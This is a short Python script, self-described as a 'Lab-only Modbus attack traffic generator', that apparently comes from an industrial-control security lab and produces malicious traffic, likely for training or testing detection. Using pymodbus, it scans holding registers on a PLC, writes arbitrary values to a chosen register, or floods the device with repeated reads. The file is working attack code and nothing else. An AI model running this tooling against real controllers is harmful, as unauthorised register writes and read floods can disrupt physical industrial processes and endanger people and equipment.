import argparse
import time

from pymodbus.client import ModbusTcpClient


def scan(client, unit):
    for address in range(0, 10):
        client.read_holding_registers(address=address, count=1, slave=unit)
        time.sleep(0.05)


def write_register(client, unit, address, value):
    client.write_register(address=address, value=value, slave=unit)


def flood_reads(client, unit, count):
    for _ in range(count):
        client.read_holding_registers(address=0, count=10, slave=unit)


def main():
    parser = argparse.ArgumentParser(description="Lab-only Modbus attack traffic generator")
    parser.add_argument("--host", default="plc")
    parser.add_argument("--port", type=int, default=1502)
    parser.add_argument("--unit", type=int, default=1)
    parser.add_argument("--mode", choices=["scan", "write", "flood"], default="write")
    parser.add_argument("--address", type=int, default=1)
    parser.add_argument("--value", type=int, default=999)
    parser.add_argument("--count", type=int, default=100)
    args = parser.parse_args()

    client = ModbusTcpClient(args.host, port=args.port)
    client.connect()
    try:
        if args.mode == "scan":
            scan(client, args.unit)
        elif args.mode == "write":
            write_register(client, args.unit, args.address, args.value)
        elif args.mode == "flood":
            flood_reads(client, args.unit, args.count)
    finally:
        client.close()


if __name__ == "__main__":
    main()
